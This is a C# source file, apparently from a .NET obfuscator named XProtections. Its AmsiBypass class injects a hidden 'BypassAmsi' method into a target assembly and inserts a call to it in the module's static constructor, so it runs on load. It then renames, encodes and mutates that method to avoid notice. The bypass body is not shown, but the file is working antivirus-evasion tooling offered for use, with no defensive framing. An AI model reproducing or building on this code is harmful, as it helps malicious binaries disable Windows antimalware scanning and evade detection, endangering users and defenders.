using dnlib.DotNet;
using dnlib.DotNet.Emit;
using XCore.Context;
using XCore.Injection;
using Xerin.Runtime;
using XProtections.Mutation;

namespace XProtections
{
	public class AmsiBypass
	{
		private static newInjector s8q;

		private static MethodDef B8A;

		public void Execute(XContext xcontext_0)
		{
			s8q = new newInjector(xcontext_0.Module, typeof(AMSI));
			B8A = s8q.FindMember("BypassAmsi") as MethodDef;
			MethodDef methodDef = xcontext_0.Module.GlobalType.FindOrCreateStaticConstructor();
			methodDef.Body.Instructions.Insert(0, OpCodes.Call.ToInstruction(B8A));
			s8q.Rename();
			MethodDef[] methodDef_ = new MethodDef[1] { B8A };
			stillWorkingOn2.EncodeFor(xcontext_0, methodDef_);
			new ThirdMutationStage().ExecuteFor(xcontext_0, B8A);
		}
	}
}
